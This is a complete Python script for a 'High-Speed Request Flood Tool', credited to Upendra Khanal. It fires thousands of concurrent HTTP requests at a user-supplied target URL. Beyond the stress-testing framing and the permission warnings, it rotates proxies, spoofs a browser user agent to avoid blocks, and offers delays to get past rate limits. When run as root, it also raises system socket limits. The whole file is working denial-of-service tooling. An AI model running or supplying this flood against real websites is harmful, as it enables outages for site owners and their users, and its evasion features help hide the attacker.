#!/usr/bin/env python3
"""
High-Speed Request Flood Tool with Rate Limit Detection
Developed by Upendra Khanal

A powerful, high-performance HTTP request flood tool optimized for 
stress testing web applications with high request rates.
Now includes detection for rate limiting and request blocking.
"""

import asyncio
import aiohttp
import re
import time
import logging
import sys
import os
from typing import Dict, List, Optional
from datetime import datetime
from urllib.parse import urlparse

# Try to import uvloop for massive performance boost on Linux/macOS
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    USING_UVLOOP = True
except ImportError:
    USING_UVLOOP = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Constants
DEFAULT_TIMEOUT = 5  # seconds
DEFAULT_CONNECTIONS = 5000  # reasonable max connections
DEFAULT_LIMIT_PER_HOST = 0  # unlimited per host
REQUEST_INTERVAL = 0.01  # delay between batches for stability


class RateLimitDetector:
    """Detects potential rate limiting or request blocking from server responses."""
    def __init__(self):
        self.status_counts = {}  # Track status code occurrences
        self.last_responses = []  # Store last N responses for pattern analysis
        self.max_stored_responses = 50
        self.consecutive_failures_threshold = 10
        self.consecutive_failures = 0
        self.last_successful_time = time.time()
        self.potential_rate_limit = False
        self.rate_limit_warned = False
        self.lock = asyncio.Lock()
        
    async def analyze_response(self, status_code, response_time):
        """Analyze a response for rate limiting signals."""
        async with self.lock:
            # Record status code
            self.status_counts[status_code] = self.status_counts.get(status_code, 0) + 1
            
            # Record response information
            self.last_responses.append({
                'status': status_code,
                'time': response_time,
                'timestamp': time.time()
            })
            
            # Keep only the last N responses
            if len(self.last_responses) > self.max_stored_responses:
                self.last_responses.pop(0)
            
            # Check for consecutive failures
            if 400 <= status_code < 600:
                self.consecutive_failures += 1
                if self.consecutive_failures >= self.consecutive_failures_threshold and not self.rate_limit_warned:
                    print(f"\n[WARNING] Detected {self.consecutive_failures} consecutive failed responses. Possible rate limiting.")
                    self.rate_limit_warned = True
                    self.potential_rate_limit = True
                    return True
            else:
                self.consecutive_failures = 0
                self.last_successful_time = time.time()
                
            # Check for 429 Too Many Requests
            if status_code == 429 and not self.rate_limit_warned:
                print("\n[WARNING] Received 429 Too Many Requests status. Server is rate limiting requests.")
                self.rate_limit_warned = True
                self.potential_rate_limit = True
                return True
                
            # Check response patterns (sudden increase in response time)
            if len(self.last_responses) >= 10:
                recent_times = [r['time'] for r in self.last_responses[-10:]]
                avg_time = sum(recent_times) / len(recent_times)
                baseline_times = [r['time'] for r in self.last_responses[:10]]
                baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else avg_time
                
                # If response time suddenly doubles and stays high
                if avg_time > baseline_avg * 2 and avg_time > 1.0 and not self.rate_limit_warned:
                    print(f"\n[WARNING] Average response time increased significantly ({baseline_avg:.2f}s → {avg_time:.2f}s). Possible rate limiting.")
                    self.rate_limit_warned = True
                    self.potential_rate_limit = True
                    return True
            
            # Check for blocks (403 Forbidden, 418 I'm a teapot, etc.)
            if status_code in [403, 418, 503] and self.status_counts.get(status_code, 0) >= 5 and not self.rate_limit_warned:
                print(f"\n[WARNING] Received multiple {status_code} responses. Server may be blocking requests.")
                self.rate_limit_warned = True
                self.potential_rate_limit = True
                return True
                
            return False
    
    def get_summary(self):
        """Return a summary of detected patterns."""
        if not self.potential_rate_limit:
            return None
            
        summary = []
        if self.consecutive_failures >= self.consecutive_failures_threshold:
            summary.append(f"- {self.consecutive_failures} consecutive failed requests")
        
        if 429 in self.status_counts:
            summary.append(f"- {self.status_counts[429]} '429 Too Many Requests' responses")
            
        if 403 in self.status_counts:
            summary.append(f"- {self.status_counts[403]} '403 Forbidden' responses")
            
        if 503 in self.status_counts:
            summary.append(f"- {self.status_counts[503]} '503 Service Unavailable' responses")
            
        # Add response time analysis
        if len(self.last_responses) >= 10:
            recent_times = [r['time'] for r in self.last_responses[-10:]]
            avg_time = sum(recent_times) / len(recent_times)
            baseline_times = [r['time'] for r in self.last_responses[:10]]
            baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else avg_time
            
            if avg_time > baseline_avg * 1.5:
                summary.append(f"- Response time increased from {baseline_avg:.2f}s to {avg_time:.2f}s")
        
        return "\n".join(summary) if summary else None


class RequestStats:
    """Tracks and displays request statistics in real-time."""
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.total_time = 0
        self.start_time = 0
        self.end_time = 0
        self.lock = asyncio.Lock()
        self.last_display_time = 0
        self.display_interval = 0.1  # Update display every 100ms
        self.peak_rps = 0  # Track peak requests per second
        self.last_total = 0  # For calculating current RPS
        self.last_rps_time = 0  # For calculating current RPS
    
    async def increment_success(self, duration: float) -> None:
        """Increment successful request count and update stats."""
        async with self.lock:
            self.success += 1
            self.total_time += duration
            await self._update_display()
    
    async def increment_failed(self) -> None:
        """Increment failed request count and update stats."""
        async with self.lock:
            self.failed += 1
            await self._update_display()
    
    async def _update_display(self) -> None:
        """Update the live counter display if interval has passed."""
        current_time = time.time()
        if current_time - self.last_display_time >= self.display_interval:
            self.last_display_time = current_time
            elapsed = current_time - self.start_time if self.start_time else 0
            total = self.success + self.failed
            
            # Calculate overall RPS
            overall_rps = total / max(0.1, elapsed)
            
            # Calculate current RPS over a short window
            current_rps = 0
            if current_time - self.last_rps_time >= 0.5 and self.last_rps_time > 0:  # 0.5 second window
                requests_in_window = total - self.last_total
                time_in_window = current_time - self.last_rps_time
                current_rps = requests_in_window / time_in_window
                self.last_total = total
                self.last_rps_time = current_time
            elif self.last_rps_time == 0:
                self.last_rps_time = current_time
                self.last_total = total
            
            # Update peak RPS
            self.peak_rps = max(self.peak_rps, current_rps)
            
            success_rate = (self.success / max(1, total)) * 100
            
            # Clear line and update display
            sys.stdout.write("\r" + " " * 100)  # Clear line
            sys.stdout.write(
                f"\r✅ {self.success} | ❌ {self.failed} | " +
                f"Rate: {overall_rps:.2f} req/s | " + 
                f"Current: {current_rps:.2f} req/s | " +
                f"Peak: {self.peak_rps:.2f} req/s | " +
                f"Success: {success_rate:.1f}%"
            )
            sys.stdout.flush()
    
    async def get_stats(self) -> Dict:
        """Get current statistics."""
        async with self.lock:
            total = self.success + self.failed
            avg_time = self.total_time / max(1, self.success) if self.success > 0 else 0
            elapsed = time.time() - self.start_time if self.start_time else 0
            rps = total / max(0.1, elapsed)  # Avoid division by zero
            
            return {
                "success": self.success,
                "failed": self.failed, 
                "total": total,
                "avg_time": round(avg_time, 4),
                "elapsed": round(elapsed, 2),
                "requests_per_second": round(rps, 2),
                "peak_rps": round(self.peak_rps, 2)
            }


class ContentAnalyzer:
    """Analyzes HTTP response content for specified patterns."""
    def __init__(self, patterns=None):
        self.patterns = patterns or []
        # Add default pattern for title
        self.patterns.append((r'<title>(.*?)</title>', "Title: {0}"))
    
    def add_pattern(self, regex: str, template: str) -> None:
        """Add a pattern to search for in responses."""
        self.patterns.append((regex, template))
    
    def add_text_search(self, text: str) -> None:
        """Add a simple text search."""
        self.patterns.append((text, f"Found: '{text}' in content"))
    
    def analyze(self, content: str) -> str:
        """Analyze content using defined patterns."""
        for pattern, template in self.patterns:
            if isinstance(pattern, str) and pattern in content:
                return template
            else:
                match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
                if match:
                    return template.format(*match.groups())
        
        return "No matching patterns found"


class FloodController:
    """Controls the request flooding process."""
    def __init__(self, url: str, stats: RequestStats, analyzer: ContentAnalyzer, 
                 timeout: float = DEFAULT_TIMEOUT, proxies: List[str] = None,
                 user_agent: str = None, show_title_once: bool = True,
                 request_delay: float = 0):
        self.url = url
        self.stats = stats
        self.analyzer = analyzer
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.semaphore = None  # Will be initialized in flood method
        self.domain = urlparse(url).netloc
        self.should_analyze_content = True  # Always analyze content to get title
        self.proxies = proxies or []  # List of proxy URLs
        self.current_proxy_index = 0
        self.titles_shown = set()  # Track titles we've already shown
        self.show_title_once = show_title_once  # Option to show title only once
        self.title_displayed = False  # Flag to track if title has been displayed
        self.request_delay = request_delay  # Delay between individual requests
        # Use a realistic user agent to avoid blocks
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
        
        # Add rate limit detector
        self.rate_limit_detector = RateLimitDetector()
        self.pause_on_rate_limit = True  # Whether to pause when rate limiting is detected
    
    async def _send_single_request(self, session: aiohttp.ClientSession, req_id: int) -> None:
        """Send a single request and extract information."""
        # Get proxy if available
        proxy = None
        if self.proxies:
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        
        # Add the delay if configured
        if self.request_delay > 0:
            await asyncio.sleep(self.request_delay)
            
        try:
            start = time.time()
            # Set headers for better compatibility
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive"
            }
            
            async with session.get(
                self.url, 
                allow_redirects=True,
                timeout=self.timeout,
                raise_for_status=False,
                ssl=False,  # Skip SSL verification for speed
                proxy=proxy,
                headers=headers
            ) as response:
                status = response.status
                duration = time.time() - start
                
                # Check for rate limiting
                is_rate_limited = await self.rate_limit_detector.analyze_response(status, duration)
                if is_rate_limited and self.pause_on_rate_limit:
                    print("\n[ACTION] Pausing requests for 5 seconds to avoid triggering more rate limits...")
                    await asyncio.sleep(5)
                    print("Resuming with reduced request rate...")
                
                # Always attempt to get title for successful requests
                if 200 <= status < 300:
                    try:
                        content = await response.text(errors='replace')
                        # Look for title
                        title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
                        if title_match and title_match.group(1):
                            title = title_match.group(1).strip()
                            
                            # If show_title_once is True, only display the title once
                            if self.show_title_once:
                                if not self.title_displayed:
                                    print(f"\n[SUCCESS] Website Title: {title}")
                                    print(f"[SUCCESS] Request completed successfully with status {status}")
                                    print("[SUCCESS] Connection to target confirmed. Continuing with flood...")
                                    sys.stdout.flush()
                                    self.title_displayed = True
                            # Otherwise display new titles as they're found
                            elif title and title not in self.titles_shown:
                                self.titles_shown.add(title)
                                print(f"\n[SUCCESS] Website Title: {title}")
                                sys.stdout.flush()
                    except Exception as e:
                        logger.debug(f"Failed to extract title: {str(e)}")
            
            await self.stats.increment_success(duration)
            
        except asyncio.TimeoutError:
            logger.debug(f"Request {req_id} timed out")
            # Mark timeouts for rate limit detection too
            await self.rate_limit_detector.analyze_response(0, self.timeout.total)
            await self.stats.increment_failed()
        except aiohttp.ClientError as e:
            logger.debug(f"Request {req_id} failed with client error: {str(e)}")
            await self.stats.increment_failed()
        except Exception as e:
            logger.debug(f"Request {req_id} failed with error: {str(e)}")
            await self.stats.increment_failed()
    
    async def _run_batch(self, session: aiohttp.ClientSession, batch_size: int, start_id: int) -> None:
        """Run a batch of requests with optimized performance."""
        tasks = []
        
        # Create all tasks upfront
        for i in range(batch_size):
            req_id = start_id + i
            
            task = asyncio.create_task(self._controlled_request(session, req_id))
            tasks.append(task)
        
        # Wait for all tasks to complete
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logger.error(f"Batch error: {str(e)}")
    
    async def _controlled_request(self, session: aiohttp.ClientSession, req_id: int) -> None:
        """Execute a request with concurrency control."""
        try:
            async with self.semaphore:
                await self._send_single_request(session, req_id)
        except asyncio.CancelledError:
            await self.stats.increment_failed()
        except Exception as e:
            logger.error(f"Task error: {str(e)}")
            await self.stats.increment_failed()
    
    async def flood(self, total_requests: int, concurrency: int, batch_size: int = 100) -> None:
        """Execute the flooding with maximized speed and enhanced performance."""
        # Initialize semaphore for concurrency control
        self.semaphore = asyncio.Semaphore(concurrency)
        self.stats.start_time = time.time()
        
        # Print header for live stats
        print("\n--- LIVE REQUEST STATISTICS ---")
        print(f"Starting flood with {concurrency} concurrent connections")
        print(f"Processing in batches of {batch_size}")
        print(f"Proxies: {'Enabled (' + str(len(self.proxies)) + ' proxies)' if self.proxies else 'Disabled'}")
        print(f"Request delay: {self.request_delay}s per request")
        print("Rate limit detection: Enabled")
        print(f"Pause on rate limit: {'Enabled' if self.pause_on_rate_limit else 'Disabled'}")
        print("Website titles will be displayed when successful connections are made")
        print("Press Ctrl+C to stop\n")
        
        # Do a single test request first to verify the URL is reachable
        print(f"Performing test request to {self.url}...")
        try:
            # Create a connector for the test request
            conn = aiohttp.TCPConnector(
                ssl=False,  # Skip SSL verification for speed
                force_close=False
            )
            
            async with aiohttp.ClientSession(
                connector=conn,
                timeout=self.timeout,
                raise_for_status=False
            ) as test_session:
                # Set headers for the test request
                headers = {
                    "User-Agent": self.user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive"
                }
                
                async with test_session.get(
                    self.url, 
                    ssl=False, 
                    headers=headers
                ) as response:
                    status = response.status
                    print(f"Test request result: Status {status}")
                    if status >= 400:
                        print(f"Warning: Server returned error status {status}")
                    
                    # Try to get the title
                    try:
                        content = await response.text(errors='replace')
                        title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
                        if title_match and title_match.group(1):
                            title = title_match.group(1).strip()
                            print(f"Website title: {title}")
                    except Exception as e:
                        print(f"Could not extract title: {str(e)}")
        except Exception as e:
            print(f"Test request failed: {str(e)}")
            print("Do you want to continue anyway? (y/n)")
            if input().lower() != 'y':
                return
        
        # Create an optimized connector for the flood
        conn = aiohttp.TCPConnector(
            limit=DEFAULT_CONNECTIONS,
            limit_per_host=DEFAULT_LIMIT_PER_HOST,
            ttl_dns_cache=300,
            ssl=False,  # Skip SSL verification for speed
            force_close=False,  # Keep connections open for performance
            enable_cleanup_closed=True  # Still enable cleanup for stability
        )
        
        # Create an asynchronous task that updates stat display periodically
        async def update_display():
            while True:
                await asyncio.sleep(0.1)  # Update 10 times per second
                stats = await self.stats.get_stats()
                if stats["total"] >= total_requests:
                    break
        
        # Start the display update task
        display_task = asyncio.create_task(update_display())
        
        # Main flood execution
        async with aiohttp.ClientSession(
            connector=conn,
            timeout=self.timeout,
            raise_for_status=False,
            trust_env=False
        ) as session:
            batches = (total_requests + batch_size - 1) // batch_size
            
            try:
                for batch in range(batches):
                    start_id = batch * batch_size + 1
                    current_batch_size = min(batch_size, total_requests - (batch * batch_size))
                    
                    if current_batch_size <= 0:
                        break
                    
                    # Print batch progress every 5 batches
                    if batch % 5 == 0:
                        logger.debug(f"Starting batch {batch+1}/{batches}...")
                    
                    await self._run_batch(session, current_batch_size, start_id)
                    
                    # Small delay between batches for stability
                    await asyncio.sleep(REQUEST_INTERVAL)
                
            except KeyboardInterrupt:
                print("\nOperation interrupted by user. Cleaning up...")
            except Exception as e:
                print(f"\nEncountered error during flood: {str(e)}")
            finally:
                # Make sure to clean up display task
                display_task.cancel()
                
                try:
                    # Give some time for tasks to clean up
                    await asyncio.sleep(0.2)
                except asyncio.CancelledError:
                    pass
        
        self.stats.end_time = time.time()
        final_stats = await self.stats.get_stats()
        
        # Show final results
        print("\n\n" + "="*60)
        print(f"Flood completed in {final_stats['elapsed']}s")
        print(f"Successful requests: {final_stats['success']}")
        print(f"Failed requests: {final_stats['failed']}")
        print(f"Average response time: {final_stats['avg_time']}s")
        print(f"Effective requests per second: {final_stats['requests_per_second']}")
        print(f"Peak requests per second: {final_stats['peak_rps']}")
        
        # Add rate limiting summary if detected
        rate_limit_summary = self.rate_limit_detector.get_summary()
        if rate_limit_summary:
            print("\nRate Limiting Detection Results:")
            print(rate_limit_summary)
            print("\nThe target website appears to have rate limiting or request blocking mechanisms.")
            print("Consider reducing concurrency or adding delays between requests.")
        else:
            print("\nNo rate limiting detected during this session.")
            
        print("="*60)


async def main_async():
    """Main asynchronous function to handle the request flood process."""
    # Display banner for the tool
    print("\n" + "="*60)
    print("⚡ HIGH-SPEED REQUEST FLOOD TOOL WITH RATE LIMIT DETECTION ⚡")
    print("Developed by Upendra Khanal")
    print("Enhanced with rate limit detection")
    print("="*60)
    if USING_UVLOOP:
        print("✅ uvloop detected and enabled for maximum performance!")
    else:
        print("ℹ️ Install 'uvloop' package for even faster performance (pip install uvloop)")
    print("="*60 + "\n")
    
    # Get user input for URL and number of requests
    url = input("Enter target URL (e.g., https://example.com): ")
    
    # Validate URL
    if not url.startswith("http"):
        url = "https://" + url
        print(f"Added https:// prefix. URL is now: {url}")
    
    # Ask for custom user-agent
    use_custom_ua = input("Do you want to use a custom User-Agent? (y/n, default: n): ").lower().startswith('y')
    user_agent = None
    if use_custom_ua:
        user_agent = input("Enter custom User-Agent string: ")
    
    while True:
        try:
            num_requests = int(input("Enter number of requests to send: "))
            if num_requests <= 0:
                print("Please enter a positive number.")
                continue
            break
        except ValueError:
            print("Please enter a valid number.")
    
    # Get concurrency level based on number of requests
    while True:
        try:
            # More conservative default for better stability
            suggested = min(500, max(50, num_requests // 10))
            concurrency_input = input(f"Enter concurrency level (parallel connections, suggested: {suggested}): ") or str(suggested)
            concurrency = int(concurrency_input)
            if concurrency <= 0:
                print("Please enter a positive number.")
                continue
            if concurrency > 2000:
                print("Warning: Very high concurrency may cause errors. Are you sure? (y/n)")
                if input().lower() != 'y':
                    continue
            break
        except ValueError:
            print("Please enter a valid number.")
    
    # Calculate batch size based on concurrency
    batch_size = min(100, max(10, concurrency // 5))  # Keep batch size reasonable
    
    # Ask for timeout
    timeout = DEFAULT_TIMEOUT
    custom_timeout = input(f"Enter request timeout in seconds (default: {DEFAULT_TIMEOUT}): ")
    if custom_timeout.strip():
        try:
            timeout = float(custom_timeout)
        except ValueError:
            print(f"Invalid timeout, using default: {DEFAULT_TIMEOUT}")
    
    # Ask for search text (simple option)
    search_text = input("Enter text to search for in responses (optional): ")
    
    # Show title only once option
    show_title_once = input("Show website title only once when successful? (y/n, default: y): ")
    show_title_once = not show_title_once.lower().startswith('n')
    
    # Add request delay option
    add_delay = input("Add delay between individual requests to bypass rate limits? (y/n, default: n): ")
    request_delay = 0
    
    if add_delay.lower().startswith('y'):
        delay_input = input("Enter delay in seconds (e.g., 0.1 for 100ms): ")
        try:
            request_delay = float(delay_input)
        except ValueError:
            print("Invalid delay, using no delay")
            request_delay = 0
    
    # Ask about rate limit detection behavior
    pause_option = input("Pause temporarily when rate limiting is detected? (y/n, default: y): ")
    pause_on_rate_limit = not pause_option.lower().startswith('n')
    
    # Show detailed logs option
    show_logs = input("Show detailed logs? (slower) (y/n, default: n): ").lower().startswith('y')
    if not show_logs:
        # Disable logging to console for speed if user doesn't want logs
        logging.getLogger().setLevel(logging.ERROR)
    
    # Ask about using proxies
    use_proxies = input("Do you want to use proxies? (y/n, default: n): ").lower().startswith('y')
    proxies = []
    
    if use_proxies:
        proxy_file = input("Enter path to proxy list file (one proxy per line): ")
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(proxies)} proxies from {proxy_file}")
        except Exception as e:
            print(f"Error loading proxy file: {str(e)}")
            use_proxies_anyway = input("Continue without proxies? (y/n, default: y): ")
            if not use_proxies_anyway.lower().startswith('y') and not use_proxies_anyway == '':
                return 1
    
    # Initialize components
    stats = RequestStats()
    analyzer = ContentAnalyzer()
    
    # Add custom pattern if specified
    if search_text:
        analyzer.add_text_search(search_text)
    
    # Initialize controller
    controller = FloodController(
        url=url,
        stats=stats,
        analyzer=analyzer,
        timeout=timeout,
        proxies=proxies,
        user_agent=user_agent,
        show_title_once=show_title_once,
        request_delay=request_delay
    )
    
    # Set rate limit pause behavior
    controller.pause_on_rate_limit = pause_on_rate_limit
    
    # Print warning before starting
    print("\nWARNING: This tool will send a large number of requests very quickly.")
    print("Make sure you have permission to test the target system.")
    print("The tool will display website title when a successful connection is made.")
    print("Rate limit detection is enabled and will warn you if the server appears to be limiting requests.")
    print("Press Ctrl+C at any time to stop.\n")
    input("Press Enter to start...")
    
    # Execute flood
    await controller.flood(num_requests, concurrency, batch_size)
    
    return 0


def main():
    """Entry point for the application."""
    try:
        # For Windows compatibility
        if sys.platform == "win32":
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
        return asyncio.run(main_async())
    except KeyboardInterrupt:
        logger.info("\nOperation cancelled by user.")
        return 130
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return 1


if __name__ == "__main__":
    # Performance optimization settings
    if sys.platform != "win32":
        import resource
        try:
            # Set a reasonable file descriptor limit
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            new_soft = min(10000, hard)  # More conservative limit for stability
            resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard))
            print(f"File descriptor limit set to {new_soft}")
            
            # Optimize TCP settings if running as root
            if os.geteuid() == 0:  # Root user
                try:
                    # Adjust system TCP settings for better performance
                    os.system("sysctl -w net.core.somaxconn=10000")
                    # Enable TCP Fast Open
                    os.system("sysctl -w net.ipv4.tcp_fastopen=3")
                    # Set reasonable TCP memory limits
                    os.system("sysctl -w net.ipv4.tcp_mem='8388608 8388608 8388608'")
                    print("TCP settings optimized for better performance")
                except Exception:
                    pass
        except Exception as e:
            print(f"Could not optimize system settings: {e}")
    
    # Disable most logging for speed
    logging.getLogger("asyncio").setLevel(logging.CRITICAL)
    logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
    
    print("\n⚡ HIGH-SPEED REQUEST FLOOD TOOL WITH RATE LIMIT DETECTION v2.1 ⚡")
    print("Developed by Upendra Khanal")
    print("Enhanced with rate limit detection")
    print("Use responsibly and only on systems you have permission to test.\n")
    
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {str(e)}")
        sys.exit(1)
